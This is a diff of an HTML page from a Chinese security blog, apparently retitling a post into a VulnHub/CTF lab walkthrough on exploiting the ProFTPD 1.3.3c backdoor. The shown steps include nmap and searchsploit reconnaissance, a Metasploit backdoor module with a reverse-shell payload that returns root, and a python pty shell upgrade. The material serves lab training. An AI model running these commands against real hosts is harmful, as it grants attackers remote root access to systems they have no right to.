@@ -6,28 +6,28 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
   <link rel="dns-prefetch" href>
-  <title>SSH服务测试 | Saw,Learnt,To think</title>
+  <title>FTP服务后门利用 | Saw,Learnt,To think</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
   <meta name="description" content="FTP File Transfer Protocol（文件传输协议） 双向传输 用户可通过客户机程序向远程主机，下载文件">
 <meta name="keywords" content="CTF靶机系列">
 <meta property="og:type" content="article">
-<meta property="og:title" content="SSH服务测试">
-<meta property="og:url" content="/2019/08/25/FTP服务后门利用/index.html">
+<meta property="og:title" content="FTP服务后门利用">
+<meta property="og:url" content="/2019/08/26/FTP服务后门利用/index.html">
 <meta property="og:site_name" content="Saw,Learnt,To think">
 <meta property="og:description" content="FTP File Transfer Protocol（文件传输协议） 双向传输 用户可通过客户机程序向远程主机，下载文件">
 <meta property="og:locale" content="en">
-<meta property="og:image" content="/2019/08/25/FTP服务后门利用/1.png">
-<meta property="og:image" content="/2019/08/25/FTP服务后门利用/2.png">
-<meta property="og:image" content="/2019/08/25/FTP服务后门利用/3.png">
-<meta property="og:image" content="/2019/08/25/FTP服务后门利用/4.png">
-<meta property="og:image" content="/2019/08/25/FTP服务后门利用/5.png">
-<meta property="og:image" content="/2019/08/25/FTP服务后门利用/6.png">
-<meta property="og:image" content="/2019/08/25/FTP服务后门利用/7.png">
-<meta property="og:updated_time" content="2020-02-12T13:59:06.514Z">
+<meta property="og:image" content="/2019/08/26/FTP服务后门利用/1.png">
+<meta property="og:image" content="/2019/08/26/FTP服务后门利用/2.png">
+<meta property="og:image" content="/2019/08/26/FTP服务后门利用/3.png">
+<meta property="og:image" content="/2019/08/26/FTP服务后门利用/4.png">
+<meta property="og:image" content="/2019/08/26/FTP服务后门利用/5.png">
+<meta property="og:image" content="/2019/08/26/FTP服务后门利用/6.png">
+<meta property="og:image" content="/2019/08/26/FTP服务后门利用/7.png">
+<meta property="og:updated_time" content="2020-02-12T14:02:27.104Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="SSH服务测试">
+<meta name="twitter:title" content="FTP服务后门利用">
 <meta name="twitter:description" content="FTP File Transfer Protocol（文件传输协议） 双向传输 用户可通过客户机程序向远程主机，下载文件">
-<meta name="twitter:image" content="/2019/08/25/FTP服务后门利用/1.png">
+<meta name="twitter:image" content="/2019/08/26/FTP服务后门利用/1.png">
   
     <link rel="alternative" href="/atom.xml" title="Saw,Learnt,To think" type="application/atom+xml">
   
@@ -162,13 +162,13 @@
         
   
     <h1 class="article-title" itemprop="name">
-      SSH服务测试
+      FTP服务后门利用
     </h1>
   
 
         
-        <a href="/2019/08/25/FTP服务后门利用/" class="archive-article-date">
-  	<time datetime="2019-08-25T05:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-08-25</time>
+        <a href="/2019/08/26/FTP服务后门利用/" class="archive-article-date">
+  	<time datetime="2019-08-26T10:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-08-26</time>
 </a>
         
       </header>
@@ -186,26 +186,26 @@
 
 <h3 id="步骤一：信息探测"><a href="#步骤一：信息探测" class="headerlink" title="步骤一：信息探测"></a>步骤一：信息探测</h3><h4 id="①扫描靶机ip地址"><a href="#①扫描靶机ip地址" class="headerlink" title="①扫描靶机ip地址"></a>①扫描靶机ip地址</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netdiscover -r 92.168.1.1/24</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2019/08/25/FTP服务后门利用/1.png" alt="1"></p>
+<p><img src="/2019/08/26/FTP服务后门利用/1.png" alt="1"></p>
 <h4 id="②nmap扫描"><a href="#②nmap扫描" class="headerlink" title="②nmap扫描"></a>②nmap扫描</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV 192.168.1.246</span><br><span class="line">nmap -A -v -T4 192.168.1.246</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2019/08/25/FTP服务后门利用/2.png" alt="2"></p>
+<p><img src="/2019/08/26/FTP服务后门利用/2.png" alt="2"></p>
 <p>==观察到开放了21端口，即FTP服务，和其版本号==</p>
 <h3 id="步骤二：信息分析"><a href="#步骤二：信息分析" class="headerlink" title="步骤二：信息分析"></a>步骤二：信息分析</h3><h4 id="①针对FTP版本"><a href="#①针对FTP版本" class="headerlink" title="①针对FTP版本"></a>①针对FTP版本</h4><p>扫描FTP版本是否有漏洞</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit ProFTPD 1.3.3c</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2019/08/25/FTP服务后门利用/3.png" alt="3"></p>
+<p><img src="/2019/08/26/FTP服务后门利用/3.png" alt="3"></p>
 <h4 id="②查看扫描到的漏洞文件"><a href="#②查看扫描到的漏洞文件" class="headerlink" title="②查看扫描到的漏洞文件"></a>②查看扫描到的漏洞文件</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /usr/share/exploitdb/exploits/linux/remote/15662.txt</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2019/08/25/FTP服务后门利用/4.png" alt="4"></p>
+<p><img src="/2019/08/26/FTP服务后门利用/4.png" alt="4"></p>
 <h3 id="步骤三：使用matasploit"><a href="#步骤三：使用matasploit" class="headerlink" title="步骤三：使用matasploit"></a>步骤三：使用matasploit</h3><p>即使用步骤二搜索到的第二个漏洞文件</p>
-<p><img src="/2019/08/25/FTP服务后门利用/5.png" alt="5"></p>
+<p><img src="/2019/08/26/FTP服务后门利用/5.png" alt="5"></p>
 <h4 id="①msfconsole搜索漏洞模块"><a href="#①msfconsole搜索漏洞模块" class="headerlink" title="①msfconsole搜索漏洞模块"></a>①msfconsole搜索漏洞模块</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">search ProFTPd-1.3.3c</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2019/08/25/FTP服务后门利用/6.png" alt="6"></p>
+<p><img src="/2019/08/26/FTP服务后门利用/6.png" alt="6"></p>
 <h4 id="②使用搜索到的，远程溢出漏洞模块"><a href="#②使用搜索到的，远程溢出漏洞模块" class="headerlink" title="②使用搜索到的，远程溢出漏洞模块"></a>②使用搜索到的，远程溢出漏洞模块</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">use exploit/unix/ftp/proftpd_133c_backdoor</span><br><span class="line">shou payload 				#查看具有哪些Payload</span><br><span class="line">set payload cmd/unix/reverse</span><br><span class="line">set rhost 192.168.1.246</span><br><span class="line">set lhost 192.168.1.200</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2019/08/25/FTP服务后门利用/7.png" alt="7"></p>
+<p><img src="/2019/08/26/FTP服务后门利用/7.png" alt="7"></p>
 <p>可观察到，直接获取了root权限</p>
 <h4 id="③优化终端"><a href="#③优化终端" class="headerlink" title="③优化终端"></a>③优化终端</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &quot;import pty;pty.spawn(&apos;/bin/bash&apos;)&quot;</span><br></pre></td></tr></table></figure>
 
@@ -311,7 +311,7 @@
     <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="//pan.baidu.com/share/qrcode?url=http:/2019/08/25/FTP服务后门利用/" alt="微信分享二维码">
+      <img src="//pan.baidu.com/share/qrcode?url=http:/2019/08/26/FTP服务后门利用/" alt="微信分享二维码">
     </div>
 </div>
 
@@ -325,18 +325,18 @@
   
 <nav id="article-nav">
   
-    <a href="/2019/08/25/SMB信息泄露/" id="article-nav-newer" class="article-nav-link-wrap">
+    <a href="/2019/09/07/SQL注入-GET参数/" id="article-nav-newer" class="article-nav-link-wrap">
       <i class="icon-circle-left"></i>
       <div class="article-nav-title">
         
-          SMB信息泄露
+          SQL注入-GET参数
         
       </div>
     </a>
   
   
-    <a href="/2019/08/25/SSH服务测试/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">SSH服务测试</div>
+    <a href="/2019/08/25/SMB信息泄露/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">SMB信息泄露</div>
       <i class="icon-circle-right"></i>
     </a>
   
@@ -464,15 +464,15 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
           <ul class="article-tag-list" q-show="showTags">
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">CTF靶机系列</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color2">VulnHub靶机系列</a>
               </li>
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color4">CTF</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">CTF靶机系列</a>
               </li>
              
               <li class="article-tag-list-item">
